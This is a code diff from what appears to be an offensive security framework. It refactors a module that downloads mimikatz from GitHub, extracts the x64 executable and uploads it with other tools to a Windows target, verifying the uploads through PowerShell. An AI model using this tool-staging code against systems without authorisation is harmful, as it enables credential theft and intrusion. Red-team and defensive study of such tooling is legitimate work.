@@ -3,12 +3,10 @@ from __future__ import annotations
 import io
 import os
 import time
-import urllib.request
 import zipfile
 
 from koi.modules.blueprint import KoiModule
-from koi.utils.cache import cache_path, get_cache, put_cache
-from koi.utils.config import TIMEOUTS
+from koi.utils.cache import cache_path, fetch_or_cache
 from koi.utils.ui import alert, accent
 
 MIMIKATZ_ZIP_URL = "https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip"
@@ -36,32 +34,9 @@ class PopulateWinModule(KoiModule):
         },
     ]
 
-    def _fetch_url(self, url: str, cache_name: str) -> tuple[bytes, str]:
-        """Download *url* locally and return its raw bytes."""
-        try:
-            with urllib.request.urlopen(url, timeout=TIMEOUTS["http_fetch"]) as resp:
-                data = resp.read()
-            put_cache(cache_name, data)
-            return data, "remote"
-        except Exception:
-            cached = get_cache(cache_name)
-            if cached is None:
-                raise
-            return cached, "cache"
-
     def _fetch_mimikatz_exe(self) -> tuple[bytes, str]:
-        """Download mimikatz_trunk.zip locally and return the x64/mimikatz.exe bytes."""
-        try:
-            with urllib.request.urlopen(MIMIKATZ_ZIP_URL, timeout=TIMEOUTS["http_fetch"]) as resp:
-                zip_bytes = resp.read()
-            put_cache(MIMIKATZ_ZIP_CACHE_NAME, zip_bytes)
-            source = "remote"
-        except Exception:
-            zip_bytes = get_cache(MIMIKATZ_ZIP_CACHE_NAME)
-            if zip_bytes is None:
-                raise
-            source = "cache"
-
+        """Download mimikatz_trunk.zip and return the x64/mimikatz.exe bytes."""
+        zip_bytes, source = fetch_or_cache(MIMIKATZ_ZIP_URL, MIMIKATZ_ZIP_CACHE_NAME)
         with zipfile.ZipFile(io.BytesIO(zip_bytes)) as zf:
             return zf.read("x64/mimikatz.exe"), source
 
@@ -79,7 +54,7 @@ class PopulateWinModule(KoiModule):
             cache_name = f"armory_{name}"
             with self.spinner(f"Fetching and uploading {name}..."):
                 try:
-                    raw, source = self._fetch_url(url, cache_name)
+                    raw, source = fetch_or_cache(url, cache_name)
                     ok  = self._upload_bytes(raw, dest)
                     if ok:
                         time.sleep(1.0)
@@ -107,8 +82,8 @@ class PopulateWinModule(KoiModule):
         if uploaded_files:
             with self.spinner("Verifying uploads..."):
                 paths_expr = "@(" + ",".join(f"'{d}'" for d, _ in uploaded_files.values()) + ")"
-                verify_raw = self._win_query(f"({paths_expr} | ForEach-Object {{(Test-Path $_).ToString()}}) -join 'KOISEP'")
-                exists_list = [x.strip().lower() == "true" for x in verify_raw.split("KOISEP")]
+                verify_raw = self._win_query(f"({paths_expr} | ForEach-Object {{(Test-Path $_).ToString()}}) -join '{self.REC_SEP}'")
+                exists_list = [x.strip().lower() == "true" for x in verify_raw.split(self.REC_SEP)]
 
             for (name, (dest, source)), exists in zip(uploaded_files.items(), exists_list):
                 if source == "cache":
